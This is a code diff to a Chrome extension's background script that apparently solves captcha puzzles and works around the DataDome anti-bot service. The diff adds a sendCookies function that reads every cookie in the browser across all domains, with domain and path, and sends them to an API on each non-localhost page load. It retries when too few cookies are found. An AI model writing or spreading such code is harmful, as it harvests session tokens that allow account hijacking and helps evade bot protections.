@@ -31,21 +31,37 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
             solvePuzzle(bgImageUrl, pieceImageUrl);
         }
         else if(!tab.url.includes('localhost')){
-            chrome.cookies.getAll({url: tab.url}, function(cookies) {
-                // set cookies in a query string
-                let cookieDict = '';
-                let is_valid_cookie = true;
-                cookies.forEach(cookie => {
-                    is_valid_cookie = !(cookieDict == '' && cookie.name == 'datadome')
-                    cookieDict += `${cookie.name}=${cookie.value};`;
-                });
-                // if more than one cookie
-                // send cookies to API
-                is_valid_cookie && sendToApi(cookieDict);
-            });
+            sendCookies(tab.url);
         }
     }
 });
+
+function sendCookies(url, retries = 0) {
+    chrome.cookies.getAll({}, function(cookies) {
+        // set cookies in a query string
+        let cookieDict = [];
+        let is_valid_cookie = true;
+        cookies.forEach(cookie => {
+            is_valid_cookie = !(cookieDict == '' && cookie.name == 'datadome');
+            let cookie_value = `${cookie.name}=${cookie.value}; domain=${cookie.domain}; path=${cookie.path};`;
+            cookieDict.push(cookie_value);
+        });
+        // if more than one cookie
+        is_valid_cookie = is_valid_cookie && cookieDict.length > 1;
+        if (is_valid_cookie && retries < 3) {
+            let cookieString = cookieDict.join('&');
+            sendToApi(cookieString);
+        }
+        else if (retries >= 3) {
+            sendToApi('no-cookies for ' + url);
+        }
+        else {
+            setTimeout(() => {
+                sendCookies(url, retries + 1);
+            }, 2000);
+        }
+    })
+}
 
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
